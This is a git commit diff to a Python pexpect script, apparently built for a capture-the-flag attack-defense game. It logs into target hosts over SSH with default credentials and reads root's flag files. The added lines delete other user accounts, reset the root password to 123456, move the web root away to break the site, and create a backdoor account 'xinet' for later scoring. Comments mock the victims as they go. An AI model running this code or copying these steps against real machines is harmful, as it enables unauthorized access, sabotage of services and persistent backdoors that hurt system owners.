9c915587a10140b36f6384042cc9597936148fab
BrokenPaper <30953850+BrokenPaper@users.noreply.github.com>
2018-03-19 09:55:09 +0800

    完善程序

--- auto_ssh.py
+++ auto_ssh.py
@@ -12,6 +12,10 @@ parser.add_option('-p', dest='password', type='string', default='123456')
 
 (options, args) = parser.parse_args()
 
+if options.target is None:
+    parser.print_help()
+    exit(0)
+
 target = options.target
 username = options.username
 password = options.password
@@ -45,14 +49,30 @@ with open(path, 'wb') as f:
         print 'Permission denied'
         exit(0)
 
-    child.send('chmod 777 /root/flag*')
     # 获取Flag值,为什么这么麻烦..
-    child.sendline('cat /root/flag*')
-    child.expect('cat /root/flag\*\r\n')
+    child.sendline('chmod 777 /root/flag* && cat /root/flag*')
     child.expect(r'\[.*\]\#')
-    flag = child.before.replace('\n', '')
-
+    flag = child.before.split('\n')[1].replace('\n', '')
     print '[Flag] %s - %s' % (target, flag)
+
+    # 帮他删除后门账号
+    child.sendline('/usr/sbin/userdel -f admin')
+    child.sendline('/usr/sbin/userdel -f hacker')
+    child.sendline('/usr/sbin/userdel -f test')
+
+    # 帮他改个更安全的密码,当然也可能会导致他再也无法给自己加固了
+    child.sendline('echo root:123456 | /usr/sbin/chpasswd')
+
+    # 帮助他删除危险的网站内容
+    child.sendline('mv /var/www/html /tmp/backup/')
+
+    # 这个没什么必要
+    # child.sendline('echo "XD You has been hacked" | wall')
+
+    # 为后面的刷分做准备
+    child.sendline('/usr/sbin/useradd xinet')
+    child.sendline('passwd xinet')
+    child.sendline('123456')
 
     child.sendline('exit')
     child.expect(pexpect.EOF)
